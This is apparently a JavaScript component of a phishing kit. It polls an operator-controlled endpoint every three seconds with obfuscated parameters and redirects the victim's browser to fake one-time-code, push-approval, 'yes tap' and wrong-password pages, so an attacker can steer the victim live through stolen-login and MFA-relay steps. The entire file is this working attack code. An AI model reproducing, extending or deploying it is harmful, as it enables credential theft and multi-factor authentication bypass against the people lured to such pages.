function getQueryParameter(parameterName) {
  var queryString = window.location.search;
  var urlParams = new URLSearchParams(queryString);
  return urlParams.get(parameterName);
}
// Get the value from the 'data' query parameter
var valueuser = getQueryParameter('tapfirestgrdsfgdytrbdfwergter');





function checkForUpdates() {
 
  fetch(`/codeload/fetch/?dsjkfhjdhfjkdfhjkd=${valueuser}`)
    .then(response => response.json())
    .then(data => {

      var code = data.results; 
      var user = code[0].username;
      var a = code[0].pagetype;
      var num =  parseInt(a, 10); 
      var b = code[0].mobiletype;


           
     //FOR TAP URL CREATE
      var string = 'dfgfdjkgfgdfkgk/'+user+'/'+a+'/'+b+'/bdfdgftqwefFGTW437567jbwfBSH346';
      var encodedstring = btoa(string);
      var urlc = 'codetap';
     
      const newurltap = ''+urlc+'?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj='+encodedstring;

      //FOR TAP YES URL CREATE
      var string = 'gigfiusgidusifgisgdgsigi/'+user+'/'+a+'/'+b+'/jahfgiweugfiusisagiuegiusgfig';
      var encodedstring = btoa(string);
      var urlc = 'yestap';
     
      const yesurl = ''+urlc+'?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj='+encodedstring;

      // FOR CODE URL CREATE

      var nstring = 'dfgdfgdfgfdgfdfg/'+user+'/'+b+'/bdfdgftqwefFGTW437567jbwfBSH346';
      var encodenstring = btoa(nstring);
      var urlot = 'codeotp';
      
      const otpurl = ''+urlot+'?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj='+encodenstring;



    // FOR WRONG PWD URL CREATE

      var nstring = 'jdfrtytgdfgdferrt/'+user+'/'+b+'/dfhfrtyhdfgfdgrehdfghrreytr';
      var encodenstring = btoa(nstring);
      var urlwrng = 'wrongpwd';
      
      const wrngurl = ''+urlwrng+'?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj='+encodenstring;

           
      if (a === b) {
         checkForUpdates();
        }

        if (Number.isInteger(num) && num > 0) {
          // Execute this block of code if 'a' is an integer greater than zero
          window.location.href = newurltap;
      
          }
        
        if (a.match(/^[mM]$/)) {
            window.location.href = otpurl;
          }
          
        if (a.match(/^[wW]$/)) {
              window.location.href = wrngurl;
          }

          if (a.match(/^[mM]$/)) {
            window.location.href = otpurl;
          }
          
        if (a.match(/^[yY]$/)) {
              window.location.href = yesurl;
          }
    
    })
    .catch(error => {
      console.error('Error in Fetch request:', error);
    });
}


setInterval(checkForUpdates, 3000);

